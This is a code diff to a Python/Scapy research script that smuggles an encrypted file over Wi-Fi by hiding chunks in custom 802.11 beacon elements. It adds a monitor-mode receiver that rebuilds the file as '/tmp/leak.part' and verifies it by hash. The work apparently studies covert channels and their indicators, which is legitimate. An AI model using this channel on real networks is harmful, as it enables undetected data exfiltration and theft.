@@ -197,13 +197,16 @@ def send_file():
     end_word = os.urandom(4)
     payload = f"{file_size}:{chunks}:{end_word}".encode('ascii')
     payload_c = box.encrypt(payload)
-    _payload = Dot11Elt(ID=253, info=payload_c, len=len(payload_c))
-    sendp(t_frame / _payload, iface=if0, verbose=0, realtime=True)
+    _payload = Dot11Elt(ID=222, info=payload_c, len=len(payload_c))
+    tmp_frame = t_frame / _payload
+    print(tmp_frame.command())
+    sendp(tmp_frame, iface=if0, verbose=0, realtime=True)
+    input("Press enter to start data transmission...")
     print("[*] Sending data...")
     f.seek(0)
     pos = 0
     start = time.time()
-    for seq in range(1, chunks + 1):           
+    for seq in range(chunks):           
         m_seq = str(seq).zfill(magic)
         #print(f"\t[i] tag: {m_seq}")
         seq_c = box.encrypt(bytes(m_seq, 'ascii'))
@@ -216,7 +219,7 @@ def send_file():
         _frame = t_frame / _seq / _data
         sendp(_frame, iface=if0, verbose=0, realtime=True)
         tell = f.tell()
-        print(f"\t[i] sent frame {seq} of {chunks}, data[{pos}:{tell}], frame size: {len(_frame)}")
+        print(f"\t[i] sent frame {seq + 1} of {chunks}, data[{pos}:{tell}], frame size: {len(_frame)}")
         pos = tell
         #input("[debug check]")
     end = time.time()
@@ -225,6 +228,85 @@ def send_file():
     print(f"[*] speed: {band / 1000} kbps")
 
 
+global recv
+recv = dict(
+    chunks = 0,
+    size = 0,
+    tally = None,
+    tmp = None,
+    done = False,
+)
+def recv_file(frame):
+    global recv
+    chunks = recv['chunks']
+    tally = recv['tally']
+    tmp = recv['tmp']
+    done = recv['done']
+    if frame.addr2 == t_frame.addr2:
+        #print(frame.command())
+        # overhead beacon
+        if frame[Dot11Elt][6].ID == 222:
+            print("[!] Incoming File request found!")
+            try:
+                msg = box.decrypt(frame[Dot11Elt][6].info)
+                s_msg = msg.split(b':')
+                f_size = int(s_msg[0])
+                chunks = int(s_msg[1])
+                tally = [*range(chunks)]
+                print(f"\t[i] file size: {f_size}, total chunks: {chunks}")
+                tmp = open('/tmp/leak.part', 'w+')
+                recv['chunks'] = chunks
+                recv['tally'] = tally
+                recv['tmp'] = tmp
+            except Exception as e:
+                print("[e] request not understood, ignoring")
+                raise e
+        # data beacon
+        elif frame[Dot11Elt][6].ID == 253 and chunks > 0 and tmp:
+            try:
+                ovh = box.decrypt(frame[Dot11Elt][6].info)
+                ovh = int(ovh)
+                data = frame[Dot11Elt][7].info
+                print(f"\t[i] chunk {ovh} received")
+                tally.remove(ovh)
+                tmp.write(f"{ovh}:{data.hex()}\n")
+                if ovh + 1 == chunks:
+                    print("[i] last chunk received!")
+                    done = True
+                    tmp.close()
+                    if tally:
+                        print(f"[!] missing chunks: {tally}")                
+                recv['tally'] = tally
+                recv['done'] = done
+            except ValueError as e:
+                print("[!] received duplicate chunk")
+            except Exception as e:
+                print(f"[e] corrupted beacon! expected chunk {chunk + (chunk * -1)}")
+        # wut
+        else:
+            print(f"[!] unexpected transmission (sanity:{recv})")
+    return done
+            
+def decode_file():
+    import hashlib
+    orig = t_file
+    saved = '/tmp/leak.part'
+    print("[*] Calculating original file sha256 hash")
+    h_orig = hashlib.sha256()
+    with open(orig, 'rb') as f:
+        h_orig.update(f.read())
+    d_orig = h_orig.hexdigest()
+    print(f"\t{d_orig}")
+    print("[*] Decrypting and calculating saved file sha256 hash")
+    h_saved = hashlib.sha256()
+    with open(saved) as f:
+        for line in f:
+            info = line.split(':')
+            h_saved.update(box.decrypt(bytes.fromhex(info[1])))
+    d_saved = h_saved.hexdigest()
+    print(f"\t{d_saved}")
+    if d_orig == d_saved:
+        print("[!] success!!")
 
 # battery of tests
 banner = """
@@ -244,5 +326,9 @@ print(banner)
 #beacon_size_stats()
 #print("[*] Beacon Size IoC Experiment")
 #beacon_histogram()
-print("[*] Send file test")
-send_file()
+#print("[*] Send file test")
+#send_file()
+print("[*] QoS receive file test")
+sniff(iface=if0, stop_filter=recv_file, monitor=True)
+print("[*] File decode test")
+decode_file()
